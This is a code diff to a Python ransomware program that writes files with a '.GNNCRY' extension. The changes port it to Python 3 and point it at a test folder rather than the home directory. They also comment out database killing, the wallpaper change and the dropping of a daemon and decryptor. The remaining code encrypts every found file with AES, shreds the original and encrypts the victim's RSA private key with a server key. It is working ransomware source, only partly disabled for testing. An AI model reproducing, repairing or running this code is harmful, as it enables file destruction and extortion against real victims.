@@ -53,20 +53,20 @@ def start_encryption(files):
         
         found_file = base64.b64decode(found_file)
 
-        try:
-            with open(found_file, 'rb') as f:
-                file_content = f.read()
-        except:
-            continue
+        # try:
+        with open(found_file, 'rb') as f:
+            file_content = f.read()
+        # except:
+        #     continue
 
         encrypted = AES_obj.encrypt(file_content)
         utils.shred(found_file)
-
+        
         new_file_name = found_file.decode('utf-8') + ".GNNCRY"
         with open(new_file_name, 'wb') as f:
             f.write(encrypted)
-
-        base64_new_file_name = base64.b64encode(new_file_name)
+            
+        base64_new_file_name = base64.b64encode(new_file_name.encode())
 
         AES_and_base64_path.append((key, base64_new_file_name))
     return AES_and_base64_path
@@ -78,15 +78,18 @@ def menu():
     except OSError:
         pass
 
-    kill_databases()
+    # kill_databases()
         
-    files = get_files.find_files(variables.home)
+    # change target from home to target folder
+    # files = get_files.find_files(variables.home)
+    files = get_files.find_files(variables.test_path)
 
     rsa_object = asymmetric.assymetric()
     rsa_object.generate_keys()
     
     Client_private_key = rsa_object.private_key_PEM
     Client_public_key = rsa_object.public_key_PEM
+    print(Client_private_key)
     encrypted_client_private_key = encrypt_priv_key(Client_private_key,
                                                     variables.server_public_key)
     
@@ -123,7 +126,7 @@ def menu():
 
     with open(variables.aes_encrypted_keys_path, 'w') as f:
         for _ in enc_aes_key_and_base64_path:
-            line = base64.b64encode(_[0]) + " " + _[1] + "\n"
+            line = base64.b64encode(_[0]).decode() + " " + _[1].decode() + "\n"
             f.write(line)
 
     enc_aes_key_and_base64_path = None
@@ -146,5 +149,5 @@ def drop_daemon_and_decryptor():
 
 if __name__ == "__main__":
     menu()
-    utils.change_wallpaper()
-    drop_daemon_and_decryptor()
+    # utils.change_wallpaper()
+    # drop_daemon_and_decryptor()
